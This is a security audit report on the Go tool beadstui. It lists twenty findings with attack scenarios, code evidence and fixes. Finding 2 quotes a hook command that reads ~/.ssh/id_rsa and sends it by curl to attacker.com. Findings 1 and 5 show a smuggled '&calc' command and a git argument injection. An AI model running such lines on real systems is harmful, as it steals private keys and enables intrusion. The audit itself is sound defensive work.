# Security Findings - beadstui (bt)

**Date:** 2026-04-09
**Scope:** Entire codebase (~92k lines Go, 28 packages)
**Iterations:** 30 (deep audit)
**Total Findings:** 20 (0 Critical, 5 Medium, 7 Low, 8 Info)

---

## [MEDIUM] Finding 1: Windows Command Injection via `cmd /c start`

- **OWASP:** A03 - Injection
- **STRIDE:** Elevation of Privilege
- **Location:** `pkg/export/github.go:610`, `pkg/export/cloudflare.go:347`
- **Confidence:** Confirmed

**Description:** On Windows, `OpenInBrowser()` and `OpenCloudflareInBrowser()` use `exec.Command("cmd", "/c", "start", url)` to open URLs. The `cmd /c start` pattern interprets shell metacharacters (`&`, `|`, `>`, etc.) in the URL argument.

**Attack Scenario:**
1. User enters a Cloudflare project name containing `&calc` in the export wizard
2. URL becomes `https://dash.cloudflare.com/?to=/:account/pages/view/foo&calc`
3. `cmd /c start https://...foo&calc` executes `calc` as a second command
4. Arbitrary command execution as the user

**Code Evidence:**
```go
// pkg/export/github.go:610
cmd = exec.Command("cmd", "/c", "start", url)

// pkg/export/cloudflare.go:347
cmd = exec.Command("cmd", "/c", "start", url)
```

**Mitigation:**
```go
// Use rundll32 instead (already used in pkg/ui/model_export.go:79)
cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
```

**References:** CWE-78 (OS Command Injection)

---

## [MEDIUM] Finding 2: Arbitrary Command Execution via Hook Config Files

- **OWASP:** A05 - Security Misconfiguration
- **STRIDE:** Elevation of Privilege
- **Location:** `pkg/hooks/executor.go:119-121`
- **Confidence:** Confirmed

**Description:** `.bt/hooks.yaml` commands are executed via `sh -c` (Unix) or `cmd /C` (Windows) with no sandboxing, verification, or user confirmation. A malicious repository containing a crafted `.bt/hooks.yaml` gains arbitrary code execution when a user clones and runs `bt`.

**Attack Scenario:**
1. Attacker creates a repository with `.bt/hooks.yaml` containing: `command: "curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)"`
2. User clones the repo and runs `bt` with export features
3. Hook executes silently as the user

**Code Evidence:**
```go
// pkg/hooks/executor.go:119-121
shell, flag := getShellCommand()
cmd := exec.CommandContext(ctx, shell, flag, hook.Command)
```

**Mitigation:** This is by-design functionality (same threat model as git hooks). Consider:
1. Adding a first-run confirmation prompt when hooks are detected in a new project
2. Adding `--no-hooks` flag (default off) for untrusted repositories
3. Documenting the security implications prominently

**References:** CWE-78 (OS Command Injection), similar to git hook attacks

---

## [MEDIUM] Finding 3: BQL Parser Stack Overflow via Recursion

- **OWASP:** A04 - Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/bql/parser.go:125-153`, `pkg/bql/memory_executor.go:53`
- **Confidence:** Confirmed

**Description:** The BQL parser and executor use mutual recursion with no depth limit. `parseFactor` calls itself for `NOT` expressions and calls `parseExpression` for parenthesized expressions. `evalExpr` similarly recurses without bounds. A deeply nested query causes unbounded stack growth.

**Attack Scenario:**
1. Attacker invokes `bt --bql "not not not not ... (10000x) ... status = open"`
2. Parser recurses 10000+ times, each frame ~100-200 bytes
3. Goroutine stack grows toward 1GB limit, eventually OOM or stack overflow
4. Process crashes

**Code Evidence:**
```go
// pkg/bql/parser.go:127-133
case TokenNot:
    p.nextToken()
    expr, err := p.parseFactor()  // recursive, no depth limit
    return &NotExpr{Expr: expr}, nil

// pkg/bql/memory_executor.go:69-70
case *NotExpr:
    return !evalExpr(e.Expr, issue, opts)  // recursive, no depth limit
```

**Mitigation:**
```go
// Add depth tracking to Parser
type Parser struct {
    // ...existing fields...
    depth int
}
const maxParseDepth = 100

func (p *Parser) parseFactor() (Expr, error) {
    p.depth++
    defer func() { p.depth-- }()
    if p.depth > maxParseDepth {
        return nil, fmt.Errorf("query too deeply nested (max %d levels)", maxParseDepth)
    }
    // ...existing code...
}
```

**References:** CWE-674 (Uncontrolled Recursion)

---

## [MEDIUM] Finding 4: SQL Injection in BQL dateToSQL (Latent)

- **OWASP:** A03 - Injection
- **STRIDE:** Tampering
- **Location:** `pkg/bql/sql.go:219-229`
- **Confidence:** Confirmed (latent - SQLBuilder not used in production)

**Description:** The `dateToSQL` method interpolates the numeric portion of date offset values directly into SQL strings via `fmt.Sprintf` without using parameterized queries. Currently safe because (a) the SQLBuilder is dead code and (b) the lexer constrains values to digits. However, this violates parameterization best practices and would become exploitable if the lexer is relaxed.

**Code Evidence:**
```go
// pkg/bql/sql.go:221-228
value := dateStr[1 : len(dateStr)-1]
switch suffix {
case 'd', 'D':
    return fmt.Sprintf("DATE_SUB(CURDATE(), INTERVAL %s DAY)", value)
    // Should be: "DATE_SUB(CURDATE(), INTERVAL ? DAY)" with b.params
```

**Mitigation:**
```go
case 'd', 'D':
    b.params = append(b.params, value)
    return "DATE_SUB(CURDATE(), INTERVAL ? DAY)"
```

**References:** CWE-89 (SQL Injection)

---

## [MEDIUM] Finding 5: Git Argument Injection via Unvalidated SHAs

- **OWASP:** A03 - Injection
- **STRIDE:** Tampering
- **Location:** `pkg/correlation/incremental.go:200,226,257`, `pkg/correlation/stream.go:415`, `pkg/correlation/reverse.go:174`, `pkg/correlation/temporal.go:143`, `pkg/correlation/cocommit.go:139,186`
- **Confidence:** Confirmed

**Description:** Git commit SHA values from beads data (JSONL/Dolt) are passed directly as arguments to `git rev-list`, `git log`, `git show` without validation. If a malicious beads data file contains crafted SHA values starting with `--`, they could be interpreted as git flags rather than arguments.

**Attack Scenario:**
1. Attacker crafts `.beads/issues.jsonl` with a commit reference containing `--exec=malicious`
2. User opens the project in bt and triggers correlation analysis
3. The crafted value is passed to `git log --exec=malicious`
4. Git interprets it as a flag (though `--exec` specifically requires interactive rebase)

**Code Evidence:**
```go
// pkg/correlation/incremental.go:200
cmd := exec.Command("git", "rev-list", "--reverse", fmt.Sprintf("%s..HEAD", sinceSHA))
// sinceSHA is not validated as hex

// pkg/correlation/stream.go:415  
args = append(args, shas...)  // shas appended without validation
```

**Mitigation:**
```go
// Validate SHA format before use
var validSHA = regexp.MustCompile(`^[0-9a-f]{4,40}$`)
func validateSHA(sha string) error {
    if !validSHA.MatchString(sha) {
        return fmt.Errorf("invalid git SHA: %q", sha)
    }
    return nil
}
```

Also add `--end-of-options` before SHA arguments where not already present.

**References:** CWE-88 (Argument Injection)

---

## [LOW] Finding 6: BQL fieldToColumn SQL Concatenation (Latent)

- **OWASP:** A03 - Injection
- **STRIDE:** Tampering
- **Location:** `pkg/bql/sql.go:186`
- **Confidence:** Confirmed (latent)

**Description:** `fieldToColumn` returns `"i." + field` for unknown field names, concatenating directly into SQL. The validator provides upstream protection via field allowlist, but the SQLBuilder doesn't self-validate.

**Mitigation:** Have `Build()` call `Validate()` internally, or reject unknown fields in `fieldToColumn` instead of falling through.

---

## [LOW] Finding 7: Global Dolt Database Name SQL Interpolation

- **OWASP:** A03 - Injection
- **STRIDE:** Tampering
- **Location:** `internal/datasource/global_dolt.go:229-231`
- **Confidence:** Likely

**Description:** Database names from `SHOW DATABASES` are interpolated into UNION ALL queries via `backtickQuote()` (backtick escaping) and `escapeSQLString()` (single-quote escaping). The escaping is correct, but a single-function safety boundary is thin. Database names come from the local Dolt server, not user input.

**Mitigation:** Add regex validation (`^[a-zA-Z0-9_-]+$`) on database names before SQL interpolation.

---

## [LOW] Finding 8: BQL Unbounded IN Value List

- **OWASP:** A04 - Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/bql/parser.go:216-230`
- **Confidence:** Confirmed

**Description:** No limit on values in `IN (...)` clause. A query with millions of values allocates unbounded `[]Value` slices (~72 bytes each).

**Mitigation:** Cap IN list at 1000 values with a parse error.

---

## [LOW] Finding 9: Self-Updater Missing io.LimitReader

- **OWASP:** A08 - Software and Data Integrity Failures
- **STRIDE:** Denial of Service
- **Location:** `pkg/updater/updater.go:548`
- **Confidence:** Confirmed

**Description:** `io.Copy(out, tr)` extracts the binary from tar without size limiting. A malicious archive could contain an oversized entry. Mitigated by download size check, SHA256 verification, and GitHub-controlled source.

**Mitigation:** `io.Copy(out, io.LimitReader(tr, maxBinarySize))` where `maxBinarySize` is a reasonable limit (e.g., 200MB).

---

## [LOW] Finding 10: DSN Exposed in Error Messages

- **OWASP:** A05 - Security Misconfiguration
- **STRIDE:** Information Disclosure
- **Location:** `internal/datasource/load.go:159`
- **Confidence:** Confirmed

**Description:** Dolt connection errors include the DSN (`root@tcp(127.0.0.1:3307)/beads?parseTime=true`) in status bar messages. While truncated by `shortError()`, the pattern leaks connection topology.

**Mitigation:** Wrap the error with a generic message: `fmt.Errorf("dolt connection failed: %w", err)` without including the DSN string.

---

## [LOW] Finding 11: Git --grep Bead ID Not Regex-Escaped

- **OWASP:** A03 - Injection
- **STRIDE:** Tampering
- **Location:** `pkg/correlation/explicit.go:231-233`
- **Confidence:** Confirmed

**Description:** Bead IDs are passed to `git --grep=<id>` without `regexp.QuoteMeta()`. A bead ID containing regex metacharacters (`.*`, `+`, etc.) could match unintended commits. Note: `extractor.go:155` correctly uses `regexp.QuoteMeta` for the `-G` flag - this is inconsistent.

**Mitigation:** Apply `regexp.QuoteMeta(pattern)` before passing to `--grep=`.

---

## [LOW] Finding 12: Swallowed Critical Errors

- **OWASP:** A05 - Security Misconfiguration
- **STRIDE:** Repudiation
- **Location:** `cmd/bt/main.go:494`, `pkg/hooks/config.go:93`, `pkg/recipe/loader.go:74`
- **Confidence:** Confirmed

**Description:** Three error-swallowing sites with potential impact:
- `main.go:494`: `asOfResolved, _ = gitLoader.ResolveRevision(*asOf)` silently uses zero-value on failure, causing `--as-of` to silently show wrong data
- `hooks/config.go:93`: `l.projectDir, _ = os.Getwd()` leaves empty project dir on failure
- `recipe/loader.go:74`: Same pattern

**Mitigation:** Handle or propagate these errors. At minimum, log a warning.

---

## [LOW] Finding 13: Windows Lock TOCTOU Race

- **OWASP:** A04 - Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/instance/lock_windows.go:218-229`
- **Confidence:** Possible

**Description:** On Windows, `os.Rename` can't overwrite existing files, so lock takeover uses `Remove` + `Rename`. Between these two operations, a third instance could claim the lock. Post-rename verification catches most races but not all.

**Mitigation:** Acceptable for a TUI tool. Worst case is two instances running simultaneously, which is handled gracefully.

---

## [LOW] Finding 14: Dolt Hardcoded Root User

- **OWASP:** A07 - Identification and Authentication Failures
- **STRIDE:** Spoofing
- **Location:** `internal/datasource/metadata.go:63`
- **Confidence:** Confirmed

**Description:** All Dolt connections use `root` with no password. Standard for local Dolt servers but prevents future authenticated remote connections without code changes.

**Mitigation:** Support optional `BT_DOLT_USER` / `BT_DOLT_PASSWORD` env vars when remote Dolt servers are needed.

---

## [LOW] Finding 15: Unrecovered TUI Main Thread Panics

- **OWASP:** A04 - Insecure Design
- **STRIDE:** Denial of Service
- **Location:** `pkg/ui/` (Update/View functions)
- **Confidence:** Possible

**Description:** Background workers have panic recovery, but the TUI main thread (Bubble Tea Update/View) does not. An unexpected panic would crash the terminal, potentially leaving it in raw mode.

**Mitigation:** Standard Bubble Tea behavior. Consider wrapping the `tea.Program.Run()` call with a deferred recover that resets terminal state.

---

## [INFO] Finding 16: edwards25519 CVE (Not Exploitable)

- **OWASP:** A06 - Vulnerable and Outdated Components
- **Location:** `go.mod` (filippo.io/edwards25519@v1.1.0)
- **Confidence:** Confirmed

GO-2026-4503: `MultiScalarMult` invalid results. The affected function is never called by bt or its dependency chain (go-sql-driver/mysql only uses `ScalarBaseMult`). Update to v1.1.1 for hygiene.

---

## [INFO] Finding 17: golang.org/x/image CVE (Not Exploitable)

- **OWASP:** A06 - Vulnerable and Outdated Components
- **Location:** `go.mod` (golang.org/x/image@v0.35.0)
- **Confidence:** Confirmed

GO-2026-4815: TIFF decoder OOM. bt only imports `font/basicfont`, never the TIFF decoder. Update to v0.38.0 for hygiene.

---

## [INFO] Finding 18: Editor Allowlist (Well-Mitigated)

- **Location:** `pkg/ui/model_editor.go:236-401`
- **Confidence:** Confirmed

The EDITOR/VISUAL handling uses a strict allowlist approach. Terminal editors are blocked, shells/interpreters are explicitly forbidden (sh, bash, zsh, cmd, powershell, etc.), and unknown editors are rejected. This is a strong defense against editor-based command injection.

---

## [INFO] Finding 19: Self-Updater Integrity (Well-Implemented)

- **Location:** `pkg/updater/updater.go:496-513, 640-644, 406-417`
- **Confidence:** Confirmed

SHA256 checksum verification on downloaded archives. Authorization header stripped on redirects to non-GitHub hosts via `isGitHubHost()` check. Binary extraction uses `filepath.Base()` preventing zip-slip. Solid integrity chain.

---

## [INFO] Finding 20: Remaining Clean Areas

The following areas were audited and found clean:
- **YAML parsing**: All 10 sites use typed structs, no `interface{}` targets (safe from billion laughs)
- **JSONL parsing**: 10MB per-line buffer cap, malformed lines skipped
- **Clipboard**: Write-only, non-sensitive data (cass search commands)
- **File permissions**: Appropriate throughout (0644 files, 0755 dirs/binaries)
- **Concurrency**: Well-synchronized with mutexes and channels, correct Bubble Tea pattern
- **GitHub token**: Properly scoped to GitHub domains only
- **Config path traversal**: All paths from well-known anchors, no user-controlled components
- **Temp files**: Random names via `os.CreateTemp`/`os.MkdirTemp`, proper cleanup
- **Dolt reconnect**: Bounded by poll interval, no amplification
- **Export wizard**: Names go to `exec.Command` (not shell), no injection
